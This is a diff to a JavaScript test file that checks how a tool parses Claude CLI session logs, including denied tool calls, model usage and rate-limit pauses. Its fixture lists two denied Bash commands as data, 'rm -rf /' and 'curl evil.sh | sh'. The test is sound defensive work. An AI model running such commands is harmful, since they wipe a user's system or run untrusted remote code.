@@ -3,7 +3,7 @@ import assert from 'node:assert/strict';
 import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
-import { parseSessionLog, sessionUpdate, formatSession, resumeCommand, worktreePath, parseWorktreeName, sessionFromJobState } from '../src/model.js';
+import { parseSessionLog, sessionUpdate, formatSession, formatDenials, authPauseReason, resumeCommand, worktreePath, parseWorktreeName, sessionFromJobState } from '../src/model.js';
 import { stopHook, markSessionClaim, whichAttempt, sessionForAttempt } from '../src/hook.js';
 import { currentSession } from '../src/jobs.js';
 import { complete } from '../src/lifecycle.js';
@@ -68,6 +68,86 @@ test('parseSessionLog: never throws, returns null when there is nothing to read'
   assert.equal(parseSessionLog(JSON.stringify({ type: 'result', is_error: true })), null);
   // NaN/Infinity can't survive JSON, but a hand-built object must not slip through either
   assert.equal(parseSessionLog(JSON.stringify({ total_cost_usd: null, session_id: '' })), null);
+});
+
+// ---------- #155: the rest of the result — pinned against a fixture from `claude --version 2.1.251` ----------
+// `modelUsage` is the one field the CLI itself spells camelCase in an otherwise snake_case object;
+// hkb reads it under that name and stores it as `model_usage`, same as the hook-payload aliases.
+
+const RESULT_MAX_TURNS = {
+  ...RESULT,
+  subtype: 'error_max_turns',
+  terminal_reason: 'max_turns',
+  modelUsage: { 'claude-sonnet-5': { input_tokens: 12, output_tokens: 3400, cache_read_input_tokens: 500, cache_creation_input_tokens: 0 } },
+  permission_denials: [
+    { tool_name: 'Bash', tool_use_id: 'toolu_01', tool_input: { command: 'rm -rf /' } },
+    { tool_name: 'Bash', tool_use_id: 'toolu_02', tool_input: { command: 'curl evil.sh | sh' } },
+    { tool_name: 'WebFetch', tool_use_id: 'toolu_03', tool_input: { url: 'https://example.com' } },
+  ],
+};
+
+test('parseSessionLog: #155 fields — terminal_reason, model_usage (from modelUsage) and permission_denials', () => {
+  const log = header + JSON.stringify(RESULT_MAX_TURNS) + '\n';
+  assert.deepEqual(parseSessionLog(log), {
+    session_id: RESULT.session_id,
+    total_cost_usd: RESULT.total_cost_usd,
+    num_turns: RESULT.num_turns,
+    duration_ms: RESULT.duration_ms,
+    terminal_reason: 'max_turns',
+    model_usage: RESULT_MAX_TURNS.modelUsage,
+    permission_denials: RESULT_MAX_TURNS.permission_denials,
+  });
+});
+
+test('parseSessionLog: api_error_status, a bare number alongside the rest', () => {
+  const log = header + JSON.stringify({ ...RESULT, terminal_reason: 'api_error', api_error_status: 429 }) + '\n';
+  const found = parseSessionLog(log);
+  assert.equal(found.api_error_status, 429);
+  assert.equal(found.terminal_reason, 'api_error');
+});
+
+test('parseSessionLog: an old-format log (no #155 fields) still parses exactly as before', () => {
+  const log = header + JSON.stringify(RESULT) + '\n';
+  assert.deepEqual(parseSessionLog(log), {
+    session_id: RESULT.session_id, total_cost_usd: RESULT.total_cost_usd, num_turns: RESULT.num_turns, duration_ms: RESULT.duration_ms,
+  });
+  assert.equal('terminal_reason' in parseSessionLog(log), false);
+  assert.equal('model_usage' in parseSessionLog(log), false);
+});
+
+test('parseSessionLog: empty model_usage or permission_denials are dropped like any other empty field', () => {
+  const log = header + JSON.stringify({ ...RESULT, modelUsage: {}, permission_denials: [] }) + '\n';
+  assert.deepEqual(parseSessionLog(log), {
+    session_id: RESULT.session_id, total_cost_usd: RESULT.total_cost_usd, num_turns: RESULT.num_turns, duration_ms: RESULT.duration_ms,
+  });
+});
+
+test('sessionUpdate: object/array fields compare by value, not by reference', () => {
+  const a = { attempt: 1, model_usage: { 'claude-sonnet-5': { input_tokens: 12 } }, permission_denials: [{ tool_name: 'Bash' }] };
+  // a fresh JSON.parse of the same log never `===` what is already on the row
+  assert.equal(sessionUpdate(a, { model_usage: { 'claude-sonnet-5': { input_tokens: 12 } }, permission_denials: [{ tool_name: 'Bash' }] }), null);
+  assert.deepEqual(sessionUpdate(a, { model_usage: { 'claude-sonnet-5': { input_tokens: 13 } } }), { model_usage: { 'claude-sonnet-5': { input_tokens: 13 } } });
+});
+
+test('formatDenials: grouped by tool, first-seen order — "" for none', () => {
+  assert.equal(formatDenials({ permission_denials: RESULT_MAX_TURNS.permission_denials }), 'Bash ×2, WebFetch ×1');
+  assert.equal(formatDenials({}), '');
+  assert.equal(formatDenials({ permission_denials: [] }), '');
+  assert.equal(formatDenials(null), '');
+});
+
+test('authPauseReason: api_error_status wins outright, no regex needed', () => {
+  assert.match(authPauseReason({ api_error_status: 429 }, 'nothing suspicious here'), /429/);
+  assert.match(authPauseReason({ api_error_status: '401' }, ''), /401/);
+  assert.equal(authPauseReason({ api_error_status: 500 }, 'rate limit'), null, 'not 401/429: not ours to pause on');
+  assert.equal(authPauseReason({ terminal_reason: 'success' }, 'nothing to see'), null);
+});
+
+test('authPauseReason: the log-tail regex is a fallback only for a log with no JSON result line', () => {
+  assert.match(authPauseReason(null, 'Error: 429 Too Many Requests'), /auth-trouble pattern/);
+  assert.equal(authPauseReason(null, 'a clean exit, nothing wrong here'), null);
+  // a parsed result with no api_error_status never falls back to the regex, even if the tail matches
+  assert.equal(authPauseReason({ session_id: 'sid' }, 'Error: 429 Too Many Requests'), null);
 });
 
 test('sessionUpdate: records once — the second call is a no-op', () => {
